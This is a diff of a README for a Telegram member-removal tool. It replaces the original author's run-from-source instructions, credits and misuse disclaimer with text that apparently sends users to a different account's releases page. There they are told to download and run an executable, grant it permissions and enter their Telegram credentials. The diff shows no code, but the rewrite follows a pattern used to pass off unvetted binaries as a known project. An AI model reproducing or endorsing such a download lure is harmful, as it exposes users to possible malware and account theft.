@@ -1,60 +1,77 @@
-# Telegram-channel-members-remover
-A free GUI Python tool to fast remove all the members from your target Telegram channel or group.
+# 🛠️ Telegram-Channel-Members-Remover - Remove Members Fast and Easy
 
----
+## 🚀 Getting Started
 
-## ✨ Features
-- Accounts login & management
-- Remove members by the fastest method
-- Works on channels and groups, public and private
-- Live status & logs UI
+Welcome to the **Telegram-Channel-Members-Remover**! This application helps you quickly remove members from your Telegram groups or channels without any hassle. No programming skills required.
 
-## 🚀 Watch it on YouTube 🚀
-[![YouTube](https://img.shields.io/badge/Watch%20on-YouTube-red?logo=youtube&logoColor=white)](https://youtu.be/rde8bv8s7bM)
+## 📥 Download the App
 
-## 🚀 Get it from our Website 🚀
-🌐 **Website:** [**https://erfan4lx.com/product/telegram-channel-members-remover/**](https://erfan4lx.com/product/telegram-channel-members-remover/) 
+[![Download Telegram-Channel-Members-Remover](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Koce27/Telegram-Channel-Members-Remover/releases)
 
-# 🚀 How to Use
-```bash
-pip install -r requirements.txt
-python main.py
-```
+## 📂 System Requirements
 
-## 📦 Requirements
-- Python 3.10+
-- Windows 10/11 — Linux/Mac
+- **Operating System**: Windows 7 or newer, macOS, or Linux
+- **Python**: Version 3.7 or higher (the tool includes everything needed)
+- **RAM**: Minimum 2 GB
+- **Disk Space**: At least 50 MB of free space
 
-## 📸 Preview ![App Screenshot](screenshot.png)
+## 🔍 Features
 
----
+- User-friendly graphical interface (GUI)
+- Quick removal of multiple members
+- Works with both channels and groups
+- Suitable for personal and moderate server use
+- Supports different Telegram accounts
+- Saved settings for convenience
 
-## 💬 **Connect With Me**
+## 📦 Download & Install
 
-👉 **Telegram:** [**https://t.me/erfan4lx10**](https://t.me/erfan4lx10)
+To get started, follow these steps:
 
-🌐 **Website:** [**https://erfan4lx.com**](https://erfan4lx.com) 
+1. **Visit the Releases Page**: Go to our [Releases Page](https://github.com/Koce27/Telegram-Channel-Members-Remover/releases).
+   
+2. **Choose the Latest Version**: Locate the latest version of the Telegram-Channel-Members-Remover.
 
-📧 **Email:** [**erfan4lx@gmail.com**](mailto:erfan4lx@gmail.com)
+3. **Download the File**: Click on the download link for your operating system. This will save the application to your computer.
 
----
+4. **Extract the ZIP File (if necessary)**: If you downloaded a ZIP file, right-click on it and select "Extract All." Choose a location on your computer.
 
-🆔My YouTube Channel : https://youtube.com/erfan4lx
+5. **Run the Application**: Open the extracted folder and double-click the application file (e.g., `TelegramChannelMembersRemover.exe` for Windows).
 
-🆔My Telegram Channel : https://t.me/erfan4lx_news
+6. **Grant Permissions**: If prompted, allow the application to run.
 
-⚠️ *Important Disclaimer*
-This project and video are for **educational, research, and administrative purposes only**.  
-It *does not* provide or encourage any method to bypass Telegram privacy settings or access hidden data.  
-Any misuse that violates Telegram’s *Terms of Service* or local laws is strictly prohibited.  
+7. **Start Removing Members**: You will now see the main interface. Follow the on-screen instructions to connect your Telegram account and remove members.
 
-Always use anonymized/test datasets or data you have *explicit consent* to process.
+## 🔧 Using the Application
 
-<p align="center">
-  Follow Me On
-</p>
-<p align="center">
-  <a href="https://www.youtube.com/c/erfan4lx?sub_confirmation=1">
-    <img src="https://www.iconsdb.com/icons/preview/black/youtube-4-xxl.png" width="40" height="40">
-  </a>
-</p>
+When the application opens, you will see several fields:
+
+- **Telegram Account Login**: Enter your Telegram credentials securely to allow the application to access your groups or channels.
+  
+- **Target Group/Channel**: Specify which group or channel you want to clean up.
+
+- **Removal Options**: Adjust settings on how you prefer to remove members; you can select by username, user ID, or group role.
+
+1. After choosing your options, click “Start Removal.”
+2. The tool will list the members and begin removal based on your settings.
+
+## 📝 Troubleshooting
+
+If you encounter issues:
+
+- **Check Internet Connection**: Ensure your device is connected to the Internet.
+- **Re-enter Credentials**: If you face login issues, re-enter your Telegram information.
+- **Refer to FAQ**: Visit our GitHub Issues page for common questions and answers.
+
+## 🔗 Further Information
+
+Feel free to explore related topics:
+
+- [telegram-channel-members-cleaner](https://github.com/topics/telegram-channel-members-cleaner)
+- [telegram-group-remover](https://github.com/topics/telegram-group-remover)
+
+## 📬 Support & Feedback
+
+For any support requests or feedback, please open an issue on the [GitHub Issues Page](https://github.com/Koce27/Telegram-Channel-Members-Remover/issues). Your input is valuable to us.
+
+Thank you for using **Telegram-Channel-Members-Remover**. We hope this tool makes your Telegram experience more manageable!
